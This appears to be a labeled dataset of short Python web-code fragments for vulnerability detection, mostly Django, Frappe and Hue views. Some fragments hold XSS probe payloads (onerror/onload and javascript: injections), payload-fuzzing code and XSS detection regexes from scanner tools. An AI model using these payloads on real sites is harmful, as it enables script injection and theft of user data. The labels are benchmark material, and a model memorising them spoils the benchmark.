url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$', 'course_groups.views.add_cohort', name=\"add_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id", "label": 0}, {"snippet_id": 31210, "code": ".SimpleCookie(os.environ.get(\"HTTP_COOKIE\")) \tuser_id=cookie.get('uuid')\t \ttable_stat=sql.select_table_metrics(user_id.value) \ttemplate=template.render(table_stat=sql.select_table_metrics(user_id.value))\t\t\t\t\t\t\t\t", "label": 0}, {"snippet_id": 41418, "code": " as creation, \t\t\t\tt1.content as content, \t\t\t\tifnull(t1.blog_intro, t1.content) as intro, \t\t\t\tt2.full_name, t2.avatar, t1.blogger, \t\t\t\t(select count(name) from `tabCommunication` \t\t\t\t\twhere \t\t\t\t\t\tcommunication_type", "label": 0}, {"snippet_id": 4518, "code": ", cnt) s=s.replace(\"e\", \"\u0451\", cnt) s=s.replace(\"o\", \"\u043e\", cnt) return s @staticmethod def fuzzErrorUnicode(s): return s +chr(random.randint(0xC2, 0xef)) @staticmethod def urlencode(s, force=False): if not", "label": 0}, {"snippet_id": 5052, "code": " 100 +'<input autofocus>', '<video><source onerror=\"alert(1)\">', '<video onerror=\"alert(1)\"><source></source></video>', '<form><button formaction=\"javascript:alert(1)\">X</button>', '<math href=\"javascript", "label": 0}, {"snippet_id": 25588, "code": "'orderpos', None) pos=cartpos or orderpos item=pos.item questions=pos.item.questions_to_ask event=kwargs.pop('event') super().__init__(*args, **kwargs) if item.admission and event.settings.attendee_names_asked", "label": 0}, {"snippet_id": 49923, "code": " can be found on http://localhost:4001/webclient.) /webclient -this url is handled through django's template system and serves the html page for the client itself along with its javascript chat program", "label": 0}, {"snippet_id": 35448, "code": ".get_value(doctype, docname, \t\t\t\t\t\t'name', cache=True)) \t\t\t\telse: \t\t\t\t\tvalues_to_fetch=['name'] +[_df.fetch_from.split('.')[-1] \t\t\t\t\t\tfor _df in fields_to_fetch] \t\t\t\t\t \t\t\t\t\tvalues=frappe.db.get_value(doctype", "label": 0}, {"snippet_id": 45540, "code": " @check_document_access_permission() def edit_bundle(request): bundle_id=request.GET.get('bundle') doc=None if bundle_id: doc=Document2.objects.get(id=bundle_id) bundle=Bundle(document=doc) else: bundle=Bundle(", "label": 0}, {"snippet_id": 29312, "code": "] \t\telse: \t\t\tcommands=[ \"sudo mv -f \" +tmp_file +\" /etc/keepalived/keepalived.conf && sudo systemctl restart keepalived\"] \telse: \t\tif kwargs.get(\"just_save\")==\"test\": \t\t\tcommands=[ \"sudo haproxy -q -c ", "label": 0}, {"snippet_id": 49163, "code": ".column_id: return self.get_url_with_query_params({ self.ordering_query_param: '-{}.{}'.format(self.column_id, \".\".join(new_query)) }) else: return self.get_url_with_query_params({ self.ordering_query_param", "label": 0}, {"snippet_id": 20808, "code": ".password_reset_done, name='auth_password_reset_done'), url(r'^heartbeat$', include('heartbeat.urls')), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^(?i)university_profile", "label": 0}, {"snippet_id": 3640, "code": " vulnerable to XSS\"}}) def xss_check(url,method,headers,body,scanid): if method=='GET' or method=='DEL': xss_get_uri(url,method,headers,body,scanid) xss_get_url(url,method,headers,body,scanid) if method=", "label": 0}, {"snippet_id": 8248, "code": "'AUTH_USE_OPENID_PROVIDER'): urlpatterns +=( url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'), url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity'", "label": 0}, {"snippet_id": 5469, "code": "'onvolumechange', 'onwaiting', 'onwebkitanimationend', 'onwebkitanimationiteration', 'onwebkitanimationstart', 'onwebkitfullscreenchange', 'onwebkitfullscreenerror', 'onwebkitkeyadded', 'onwebkitkeyerror", "label": 0}, {"snippet_id": 50059, "code": " ajax/comet long-polling transport \"\"\" isLeaf=True allowedMethods=('POST',) def __init__(self): self.requests={} self.databuffer={} self.last_alive={} self.keep_alive=None def _responseFailed(self, failure", "label": 0}, {"snippet_id": 36363, "code": ".format_data_map \t\telse: \t\t\treturn True \tdef reset_values_if_no_permlevel_access(self, has_access_to, high_permlevel_fields): \t\t\"\"\"If the user does not have permissions at permlevel > 0, then reset the", "label": 0}, {"snippet_id": 1829, "code": "\"response header\",res_headers['Content-Type'] if res_headers['Content-Type']: if res_headers['Content-Type'].find('application/json') !=-1 or res_headers['Content-Type'].find('text/plain') !=-1: impact", "label": 0}, {"snippet_id": 44307, "code": "=Workflow() workflow.set_workspace(request.user) workflow.check_workspace(request.fs, request.user) workflow_data=workflow.get_data() api=get_oozie(request.user) credentials=Credentials() try: credentials", "label": 0}, {"snippet_id": 4995, "code": "\"><y///oNMousEDown=((confirm))()>Click', '<a/href=javascript&colon;co\\u006efirm& '<img src=x onerror=confir\\u006d`1`>', '<svg/onload=co\\u006efir\\u006d`1`>', '<?xml version=\"1.0\"?><html><script xmlns=\"http", "label": 0}, {"snippet_id": 11480, "code": ".contrib import admin from django.conf.urls.static import static from. import one_time_startup import django.contrib.auth.views if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE", "label": 0}, {"snippet_id": 48999, "code": " 'get_absolute_url'): raise SmartListException(\"Please make sure your model{} implements get_absolute_url()\".format(type(self.object))) return format_html( '<td><a href=\"{}\">{}</a></td>', self.object.get_absolute_url", "label": 0}, {"snippet_id": 29432, "code": ") \t\t\tbind[1]=bind[1].strip(' ') \t\t\tbind=bind[1].split(\"ssl\") \t\t\tbind=bind[0].strip(' \\t\\n\\r') \t\t\tfirewalld_commands.append('sudo firewall-cmd --zone=public --add-port=%s/tcp --permanent' % bind) \t\t\t\t \tfirewalld_commands", "label": 0}, {"snippet_id": 5480, "code": "'onwebkitkeymessage', 'onwebkitneedkey', 'onwebkitsourceclose', 'onwebkitsourceended', 'onwebkitsourceopen', 'onwebkitspeechchange', 'onwebkittransitionend', 'onwheel' ] _htmlTemplate=''' <!DOCTYPE html> <html> <head>", "label": 0}, {"snippet_id": 1490, "code": ".vulnerabilities import alerts app=Flask(__name__,template_folder='../Dashboard/templates',static_folder='../Dashboard/static') client=MongoClient('localhost',27017) global db db=client.apiscan def generate_hash():", "label": 0}, {"snippet_id": 39429, "code": "\"\"update `tab{doctype}` \t\t\t\tset{values} where name=%s\"\"\".format( \t\t\t\t\tdoctype=self.doctype, \t\t\t\t\tvalues=\", \".join([\"`\"+c+\"`=%s\" for c in columns]) \t\t\t\t), list(d.values()) +[name]) \t\texcept Exception as", "label": 0}, {"snippet_id": 832, "code": " import urlparse from utils.logger import logger from utils.db import Database_update from utils.config import get_value dbupdate=Database_update() api_logger=logger() def fetch_xss_payload(): payload_list=", "label": 0}, {"snippet_id": 36106, "code": " fieldname: Fieldname for which precision is required. \t\t:param parentfield: If fieldname is in child table.\"\"\" \t\tfrom frappe.model.meta import get_field_precision \t\tif parentfield and not isinstance(parentfield", "label": 0}, {"snippet_id": 28073, "code": ".render_json({'status': 'success'}) class LogoutHandler(base_handler.Handler): \"\"\"Log out handler.\"\"\" @handler.unsupported_on_local_server @handler.require_csrf_token @handler.get(handler.HTML) def get(self): \"\"", "label": 0}, {"snippet_id": 2146, "code": " parsed_url=url for payload in xss_payloads: xss_request_url=req.api_request(parsed_url+'/'+payload,\"GET\",headers) if result is not True: decoded_payload=xss_payload_decode(payload) if xss_request_url.text", "label": 0}, {"snippet_id": 41096, "code": "<!--markdown -->\" in context.content: \t\t\tcontext.content=markdown(context.content) \t\timage=find_first_image(self.content) \t\tif image: \t\t\tcontext.metatags[\"image\"]=image \t\tcontext.comment_list=get_comment_list", "label": 0}, {"snippet_id": 52745, "code": "=Workflow(document=Document2.objects.get(id=doc_id)) ParametersFormSet=formset_factory(ParameterForm, extra=0) if request.method=='POST': params_form=ParametersFormSet(request.POST) if params_form.is_valid", "label": 0}, {"snippet_id": 14766, "code": "( suite.cmd, self._expected_command(name=name, store='invalid') ) def test_serversonly(self): suite=BokChoyTestSuite('', serversonly=True) self.assertEqual(suite.cmd, \"\") def test_verify_xss(self): suite", "label": 0}, {"snippet_id": 11797, "code": "'404.html'}, name=\"404\"), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^jobs$', 'static_template_view.views.render', {'template': 'jobs.html'}, name=\"jobs\"), url(r'^press$", "label": 0}, {"snippet_id": 41419, "code": "\t\t\t\tt1.content as content, \t\t\t\tifnull(t1.blog_intro, t1.content) as intro, \t\t\t\tt2.full_name, t2.avatar, t1.blogger, \t\t\t\t(select count(name) from `tabCommunication` \t\t\t\t\twhere \t\t\t\t\t\tcommunication_type='Comment", "label": 0}, {"snippet_id": 34668, "code": "\t\t\t\t\tif d[fieldname]==None: \t\t\t\t\t\td[fieldname]=0 \t\t\t\t\telif(not isinstance(d[fieldname], int) or d[fieldname] > 1): \t\t\t\t\t\td[fieldname]=1 if cint(d[fieldname]) else 0 \t\t\t\telif df.fieldtype==\"Int\" and not", "label": 0}, {"snippet_id": 52225, "code": ".')) return HttpResponse(json.dumps(response), mimetype=\"application/json\") @check_document_access_permission() def copy_workflow(request): if request.method !='POST': raise PopupException(_('A POST request", "label": 0}, {"snippet_id": 21702, "code": "'open_ended_notifications'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$', 'open_ended_grading.views.peer_grading', name='peer_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+", "label": 0}, {"snippet_id": 31027, "code": "(master) \t\tfunct.syn_flood_protect(slave) \t \tos.system(\"cp scripts/%s.\" % script) \t\t \terror=str(funct.upload(master, tmp_config_path, script)) \tif error: \t\tprint('error: '+error) \t\tsys.exit() \tfunct.upload", "label": 0}, {"snippet_id": 53396, "code": " json.dumps(doc is None or doc.doc.get().is_editable(request.user)) }) def new_bundle(request): return edit_bundle(request) @check_document_modify_permission() def save_bundle(request): response={'status", "label": 0}, {"snippet_id": 32767, "code": "=1): self.wfile.write( ('<tr class=\"u-pre u-monospace FileContents-line\">' '<td class=\"u-lineNum u-noSelect FileContents-lineNum\">' '<a name=\"%(num)s\" ' 'onclick=\"window.location.hash=%(quot)s '%(num)s", "label": 0}, {"snippet_id": 7467, "code": "/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.xqueue_callback', name='xqueue_callback'), url(r'^change_setting$', 'student.views.change_setting', name", "label": 0}, {"snippet_id": 20171, "code": " the directory that contains the directories that have courses in them. For example, if the course is located in `test_root/courses/test-example-course/`, self.imports_dir should be `test_root/courses/`", "label": 0}, {"snippet_id": 12524, "code": "<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$', 'course_groups.views.users_in_cohort', name=\"list_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$", "label": 0}, {"snippet_id": 14222, "code": "*?)$', 'courseware.views.submission_history', name='submission_history'), ) if settings.ENABLE_JASMINE: urlpatterns +=(url(r'^_jasmine/', include('django_jasmine.urls')),) if settings.DEBUG or settings", "label": 0}, {"snippet_id": 39208, "code": "=convert_dates_to_str) \t\tdoc[\"doctype\"]=self.doctype \t\tfor df in self.meta.get_table_fields(): \t\t\tchildren=self.get(df.fieldname) or[] \t\t\tdoc[df.fieldname]=[d.as_dict(no_nulls=no_nulls) for d in children] \t\tif no_nulls: ", "label": 0}, {"snippet_id": 11167, "code": "\\n' while True: try: sleep(10000) except KeyboardInterrupt: print \"Stopping bok-choy servers.\\n\" break @property def cmd(self): \"\"\" This method composes the nosetests command to send to the terminal. If", "label": 0}, {"snippet_id": 29158, "code": "=[ \"sudo chmod +x \"+tmp_config_path+script+\" && \" +tmp_config_path+script +\" PROXY=\" +proxy+ \t\t\t\t\" HAPROXY_PATH=\"+haproxy_dir +\" VERSION=\"+ver] \t \terror=str(upload(serv, tmp_config_path, script)) \tif error", "label": 0}, {"snippet_id": 5223, "code": "></div>' % payload def script(self): payload=\"<script src='%s'></script>\" % self.url return payload def event(self, element, src, event, js): payload=\"<%s src=\" % element payload +='\"%s\" ' % src payload", "label": 0}, {"snippet_id": 32408, "code": " _separator): \"\"\"Convert a string(representing a section title) to URL anchor name. This function is passed to \"toc\" extension as an extension option, so we can emulate the way how Gitiles converts header titles", "label": 0}, {"snippet_id": 46046, "code": ".can_read_or_exception(request.user) else: collection_doc.doc.get().can_read_or_exception(request.user) collection=Collection2(request.user, document=collection_doc) except Exception, e: raise PopupException(e, title=_", "label": 0}, {"snippet_id": 18731, "code": "'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$', 'courseware.views.news', name=\"news\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/', include('django_comment_client.urls')) ) urlpatterns +=", "label": 0}, {"snippet_id": 32257, "code": "-directory', type=str, default=SRC_DIR) parser.add_argument('-e', '--external', action='store_true', help='whether to bind to external port') parser.add_argument('file', nargs='?', help='open file in browser", "label": 0}, {"snippet_id": 48312, "code": " return HttpResponseRedirect(\"/admin?error=noyb\") if current_reservation.submitted==True: return HttpResponseRedirect(\"/admin?error=Already%20submitted\") if \"article_id\" in request.POST: aid: int=int(request", "label": 0}, {"snippet_id": 52531, "code": "')) copied_properties=json.loads(request.POST.get('copiedProperties', '{}')) _properties=dict(NODES[node['widgetType']].get_fields()) _properties.update(dict([(_property['name'], _property['value']) for", "label": 0}, {"snippet_id": 8996, "code": "\"user_software_license\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.xqueue_callback', name='xqueue_callback", "label": 0}, {"snippet_id": 25884, "code": "=help_text, initial=dateutil.parser.parse(initial.answer).time() if initial and initial.answer else None, widget=TimePickerWidget(time_format=get_format_without_seconds('TIME_INPUT_FORMATS')), ) elif q.type", "label": 0}, {"snippet_id": 6980, "code": " 'dashboard.views.dashboard'), url(r'^change_email$', 'student.views.change_email_request', name=\"change_email\"), url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'), url(r'^change_name$", "label": 0}, {"snippet_id": 6727, "code": "): \"\"\" Default language code to use when looking for web pages('en'). \"\"\" return self.config.get(self.section, 'default_language') @property def base_url(self): \"\"\" Base URL of the IdP. The default base", "label": 0}, {"snippet_id": 15, "code": ".logger import logger from utils.db import Database_update from utils.config import get_value dbupdate=Database_update() api_logger=logger() def fetch_xss_payload(): payload_list=[] if os.getcwd().split", "label": 0}, {"snippet_id": 36342, "code": " \t\t\"\"\"Returns True if shown via Print Format::`format_data` property. \t\t\tCalled from within standard print format.\"\"\" \t\tdoc=getattr(self, \"parent_doc\", self) \t\tif hasattr(doc, \"format_data_map\"): \t\t\treturn", "label": 0}, {"snippet_id": 12427, "code": ">[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$', 'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$", "label": 0}, {"snippet_id": 14048, "code": "(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$', 'course_groups.views.users_in_cohort', name=\"list_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id", "label": 0}, {"snippet_id": 34626, "code": "\"name\", None): \t\t\tvalue.__dict__['__islocal']=1 \t\treturn value \tdef get_valid_dict(self, sanitize=True, convert_dates_to_str=False): \t\td=frappe._dict() \t\tfor fieldname in self.meta.get_valid_columns(): \t", "label": 0}, {"snippet_id": 32799, "code": "': \"'\", 'line': line}) self.wfile.write('</table>') self._WriteTemplate('footer.html') def _DoCSS(self, template): self._WriteHeader('text/css') self._WriteTemplate(template) def _DoNotFound(self): self", "label": 0}, {"snippet_id": 295, "code": " f: for line in f: if line: payload_list.append(line.rstrip()) return payload_list def check_xss_impact(res_headers): if res_headers['Content-Type']: if 'application/json' or 'text/plain'in xss_request", "label": 1}, {"snippet_id": 32284, "code": "(argv) top_level=os.path.realpath(args.directory) hostname='0.0.0.0' if args.external else 'localhost' server_address=(hostname, args.port) s=Server(server_address, top_level) origin='http://' +hostname if", "label": 0}, {"snippet_id": 13708, "code": "/(?P<book_index>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index',", "label": 1}, {"snippet_id": 22456, "code": "'static_template_view.views.render', {'template': 'jobs.html'}, name=\"jobs\"), url(r'^press$', 'student.views.press', name=\"press\"), url(r'^media-kit$', 'static_template_view.views.render', {'template': 'media-kit.html", "label": 0}, {"snippet_id": 11413, "code": "( zipped_course=zipped_course, courses_dir=self.imports_dir, ) ) def generate_html_reports(self): \"\"\" Runs pa11ycrawler json-to-html \"\"\" cmd_str=( 'pa11ycrawler json-to-html --pa11ycrawler-reports-dir=", "label": 0}, {"snippet_id": 46188, "code": "} if request.GET.get('format', 'plain')=='json': return JsonResponse({ 'collection': collection.get_props(request.user), 'query': query, 'initial':{ 'collections': collections, 'layout': DEFAULT_LAYOUT", "label": 0}, {"snippet_id": 9089, "code": "\"course_root\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$', 'courseware.views.course_info', name=\"info\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$', 'courseware.views.syllabus", "label": 0}, {"snippet_id": 20709, "code": "=\"accounts_login\"), url(r'^login_ajax$', 'student.views.login_user', name=\"login\"), url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'), url(r'^logout$', 'student.views.logout_user', name", "label": 0}, {"snippet_id": 24450, "code": ".get('test_spec', None) self.default_store=kwargs.get('default_store', None) self.verbosity=kwargs.get('verbosity', DEFAULT_VERBOSITY) self.num_processes=kwargs.get('num_processes', DEFAULT_NUM_PROCESSES", "label": 0}, {"snippet_id": 40291, "code": ".get_field(fieldname) \t\t\tsanitized_value=value \t\t\tif df and df.get(\"fieldtype\") in(\"Data\", \"Code\", \"Small Text\") and df.get(\"options\")==\"Email\": \t\t\t\tsanitized_value=sanitize_email(value) \t\t\telif df and(df.get", "label": 0}, {"snippet_id": 33216, "code": ".response.write(ex.message) self.abort(400) build=model.Build.get_by_id(build_id) can_view=build and user.can_view_build_async(build).get_result() if not can_view: if auth.get_current_identity().is_anonymous", "label": 1}, {"snippet_id": 28719, "code": " level is None: \t\tlevel=1 \t\t \ttry: \t\treturn True if role <=level else False \texcept: \t\treturn False \t\tpass def page_for_admin(**kwargs): \tgive_level=1 \tgive_level=kwargs.get(\"level\") \t\t \tif not is_admin", "label": 1}, {"snippet_id": 50401, "code": " cmdarray[2]]}) return '\"\"' def mode_receive(self, request): \"\"\" This is called by render_POST when the client is telling us that it is ready to receive data as soon as it is available. This is the basis of a", "label": 0}, {"snippet_id": 52938, "code": " doc=None if coordinator_id: doc=Document2.objects.get(id=coordinator_id) coordinator=Coordinator(document=doc) else: coordinator=Coordinator() api=get_oozie(request.user) credentials=Credentials() try", "label": 0}, {"snippet_id": 21103, "code": "'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$', 'courseware.views.jump_to', name=\"jump_to\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$'", "label": 0}, {"snippet_id": 44633, "code": "'doc1_id']=workflow_doc.doc.get().id response['message']=_('Page saved !') return HttpResponse(json.dumps(response), mimetype=\"application/json\") def new_node(request): response={'status': -1} node=json", "label": 0}, {"snippet_id": 42843, "code": ".throw(_(\"Options not set for link field{0}\").format(df.fieldname)) \t\t\t\telse: \t\t\t\t\tdoctype=self.get(df.options) \t\t\t\t\tif not doctype: \t\t\t\t\t\tfrappe.throw(_(\"{0} must be set first\").format(self.meta.get_label", "label": 0}, {"snippet_id": 29595, "code": "'UTF-8')) \t\t\treturn stdout.read().decode(encoding='UTF-8') \t\telif kwargs.get('retunr_err')==1: \t\t\treturn stderr.read().decode(encoding='UTF-8') \t\telse: \t\t\treturn stdout.read().decode(encoding='UTF-8') \t\t\t", "label": 0}, {"snippet_id": 36719, "code": "\tcontext.updated=global_date_format(self.published_on) \t\tif self.blogger: \t\t\tcontext.blogger_info=frappe.get_doc(\"Blogger\", self.blogger).as_dict() \t\tcontext.description=self.blog_intro or self.content[:140", "label": 0}, {"snippet_id": 37334, "code": "\t \t\tcontext.full_name=get_fullname(self.owner) \t\tcontext.updated=global_date_format(self.published_on) \t\tif self.blogger: \t\t\tcontext.blogger_info=frappe.get_doc(\"Blogger\", self.blogger).as_dict() \t\tcontext", "label": 0}, {"snippet_id": 10507, "code": ") return expected_statement def test_default(self): suite=Pa11yCrawler('') self.assertEqual( suite.cmd, self._expected_command(suite.pa11y_report_dir, suite.start_urls) ) def test_get_test_course(self)", "label": 0}, {"snippet_id": 37896, "code": ":140] \t\t\tself.blog_intro=strip_html_tags(self.blog_intro) \t\tif self.blog_intro: \t\t\tself.blog_intro=self.blog_intro[:140] \t\tif self.published and not self.published_on: \t\t\tself.published_on=today() \t\t \t", "label": 0}, {"snippet_id": 26957, "code": " DEBUG==1: print post_params with open(\"response_\" +str(form_counter) +\"_\" +str(counter) +\".html\", \"w\") as f: f.write(r.content) if r.content.find(xss)>=0: print \"[+] Target is VULNERABLE\" print \"Url: \"", "label": 0}, {"snippet_id": 32827, "code": "/html', status_code=404) self.wfile.write('<html><body>%s not found</body></html>' % self.path) def _DoUnknown(self): self._WriteHeader('text/html', status_code=501) self.wfile.write('<html><body>I do not", "label": 0}, {"snippet_id": 45327, "code": "'status']=0 response['id']=coordinator_doc.id response['message']=_('Saved !') return HttpResponse(json.dumps(response), mimetype=\"application/json\") def gen_xml_coordinator(request): response={'status'", "label": 0}, {"snippet_id": 47104, "code": "=dict( version_id=lambda v, c, m, p: m.version_id-1, json=lambda v, c, m, p: Markup(\"<pre>{0}</pre>\".format( json.dumps(m.json, indent=2, sort_keys=True))) ) column_filters=('created', 'updated',) column_default_sort", "label": 1}, {"snippet_id": 42572, "code": " show_unique_validation_message(self, e): \t\ttype, value, traceback=sys.exc_info() \t\tfieldname, label=str(e).split(\"'\")[-2], None \t\t \t\t \t\tif \"unique_\" in fieldname: \t\t\tfieldname=fieldname.split(\"_\", 1)[1] \t\tdf=self", "label": 0}, {"snippet_id": 20149, "code": "() msg=colorize('green', \"Confirming servers are running...\") print msg bokchoy_utils.start_servers(self.default_store, self.coveragerc) def load_courses(self): \"\"\" Loads courses from self.imports_dir.", "label": 0}, {"snippet_id": 31221, "code": ") \ttemplate=template.render(table_stat=sql.select_table_metrics(user_id.value))\t\t\t\t\t\t\t\t\t\t\t \tprint(template) \t\t if form.getvalue('metrics'): \tfrom datetime import timedelta \tfrom bokeh.plotting import figure", "label": 0}, {"snippet_id": 46881, "code": " @property async def user(self): return await GithubUser.get(gid=self.github_id) @property async def n_likes(self): return(await self.stats).love_count class CommentMixin: async def add_comment(self, user_id", "label": 0}, {"snippet_id": 35331, "code": "\t\treturn missing \tdef get_invalid_links(self, is_submittable=False): \t\t'''Returns list of invalid links and also updates fetch values if not set''' \t\tdef get_msg(df, docname): \t\t\tif self.parentfield: \t", "label": 0}, {"snippet_id": 19811, "code": " when running tests(split or draft) num_processes -number of processes or threads to use in tests. Recommendation is that this is less than or equal to the number of available processors. verify_xss -when", "label": 0}, {"snippet_id": 35223, "code": ", flt(self.get(df.fieldname))) \t\tif self.docstatus is not None: \t\t\tself.docstatus=cint(self.docstatus) \tdef _get_missing_mandatory_fields(self): \t\t\"\"\"Get mandatory fields that do not have any values\"\"\"", "label": 0}, {"snippet_id": 38864, "code": "\treturn value \t\t\traise ValueError( \t\t\t\t'Document for field \"{0}\" attached to child table of \"{1}\" must be a dict or BaseDocument, not{2}({3})'.format(key, \t\t\t\t\tself.name, str(type(value))[1:-1], value) \t\t", "label": 0}, {"snippet_id": 33377, "code": " CronUpdateBuckets), webapp2.Route(r'/internal/cron/buildbucket/bq-export-prod', bq.CronExportBuildsProd), webapp2.Route(r'/internal/cron/buildbucket/bq-export-experimental', bq.CronExportBuildsExperimental", "label": 0}, {"snippet_id": 39164, "code": "\"): \t\t\t\tfrom frappe.model.meta import get_table_columns \t\t\t\tvalid=get_table_columns(self.doctype) \t\t\telse: \t\t\t\tvalid=self.meta.get_valid_columns() \t\t\tfrappe.local.valid_columns[self.doctype]=valid \t\treturn", "label": 0}, {"snippet_id": 32569, "code": ".server.top_level): self._DoUnknown() elif path in('/base.css', '/doc.css', '/prettify.css'): self._DoCSS(path[1:]) elif not os.path.exists(full_path): self._DoNotFound() elif path.lower().endswith('.md')", "label": 0}, {"snippet_id": 17500, "code": " settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'): urlpatterns +=( url(r'^edinsights_service/', include('edinsights.core.urls')), ) import edinsights.core.registry urlpatterns +=( url(r'^comm", "label": 0}, {"snippet_id": 13179, "code": "'student.views.password_reset', name='password_reset'), url(r'^password_change/$', django.contrib.auth.views.password_change, name='auth_password_change'), url(r'^password_change_done/$', django.contrib", "label": 0}, {"snippet_id": 48829, "code": "': return self.model._meta.verbose_name.title() try: field=getattr(self.model, self.field_name) except AttributeError as e: return self.field_name.title() if callable(field) and getattr(field, 'short_description", "label": 0}, {"snippet_id": 38584, "code": "\t\t\telse: \t\t\t\traise ImportError(doctype) \t\t_classes[doctype]=_class \treturn _classes[doctype] class BaseDocument(object): \tignore_in_getter=(\"doctype\", \"_meta\", \"meta\", \"_table_fields\", \"_valid_columns\"", "label": 0}, {"snippet_id": 10243, "code": ".set('VERIFY_XSS', 'True') with self.env_var_override: suite=BokChoyTestSuite('') name='tests' self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True)) def test_test_dir(self): test_dir", "label": 1}, {"snippet_id": 50425, "code": " available. This is the basis of a long-polling(comet) mechanism: the server will wait to reply until data is available. Args: request(Request): Incoming request. \"\"\" csessid=request.args.get('csessid')", "label": 0}, {"snippet_id": 23518, "code": "'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r", "label": 0}, {"snippet_id": 52267, "code": "' copy_doc=doc2.doc.get().copy(name=name, owner=request.user) doc2.pk=None doc2.id=None doc2.uuid=str(uuid.uuid4()) doc2.name=name doc2.owner=request.user doc2.save() doc2.doc.all().delete() doc2.doc.add", "label": 0}, {"snippet_id": 43081, "code": "\t\t\t\tfrappe.throw(_('{0}{1} cannot be \"{2}\". It should be one of \"{3}\"').format(prefix, label, \t\t\t\t\tvalue, comma_options)) \tdef _validate_constants(self): \t\tif frappe.flags.in_import or self.is_new() or", "label": 0}, {"snippet_id": 22106, "code": "), ) urlpatterns=patterns(*urlpatterns) if settings.DEBUG: urlpatterns +=static(settings.STATIC_URL, document_root=settings.STATIC_ROOT) handler404='static_template_view.views.render_404' handler500='static_template_view", "label": 0}, {"snippet_id": 33460, "code": " sig in self.signatures[injection_types]: \t\t\t\tmatch=re.findall(re.escape(sig), response) \t\t\t\tif match and any(x in payload for x in \"><\"): \t\t\t\t\tself.found(injection_types, url, parameter, payload) \t\t\t\t", "label": 1}, {"snippet_id": 16311, "code": "'org_id': 'RiceX'}), url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'ANUx'}), url(r'^(?i)university_profile/EPFLx$", "label": 0}, {"snippet_id": 32616, "code": ".jpg'): self._DoImage(full_path, 'image/jpeg') elif os.path.isdir(full_path): self._DoDirListing(full_path) elif os.path.exists(full_path): self._DoRawSourceFile(full_path) else: self._DoUnknown() def _DoMD", "label": 0}, {"snippet_id": 33427, "code": "(\"((\\%3C)|<)((\\%69)|i|(\\%49))((\\%6D)|m|(\\%4D))((\\%67)|g|(\\%47))[^\\n]+((\\%3E)|>)\") \t\t\tif any(x in _payload for x in \"\\\"'><;/\"): \t\t\t\treturn _payload \tdef check(self, url, payload, response, parameter): \t", "label": 1}, {"snippet_id": 29205, "code": "'haproxy_sock_port') \tver=\"\" \tcmd=\"echo 'show info' |nc %s %s |grep Version |awk '{print $2}'\" %(serv, haproxy_sock_port) \toutput, stderr=subprocess_execute(cmd) \tfor line in output: \t\tver=line \treturn", "label": 0}, {"snippet_id": 40295, "code": " and df.get(\"fieldtype\") in(\"Data\", \"Code\", \"Small Text\") and df.get(\"options\")==\"Email\": \t\t\t\tsanitized_value=sanitize_email(value) \t\t\telif df and(df.get(\"ignore_xss_filter\") \t\t\t\t\t\tor(df.get(\"fieldtype\")=", "label": 0}, {"snippet_id": 3347, "code": " scanid, \"url\": url, \"alert\": \"Cross Site Scripting via referer header\", \"impact\": impact, \"req_headers\": temp_headers, \"req_body\":body, \"res_headers\": ref_header_xss.headers,\"res_body\": ref_header_xss.text", "label": 0}, {"snippet_id": 42407, "code": " not self.name: \t\t\t \t\t\tset_new_name(self) \t\tif not self.creation: \t\t\tself.creation=self.modified=now() \t\t\tself.created_by=self.modifield_by=frappe.session.user \t\td=self.get_valid_dict(convert_dates_to_str", "label": 0}, {"snippet_id": 36606, "code": " strip_html_tags, markdown from frappe.website.utils import find_first_image, get_comment_list class BlogPost(WebsiteGenerator): \twebsite=frappe._dict( \t\torder_by=\"published_on 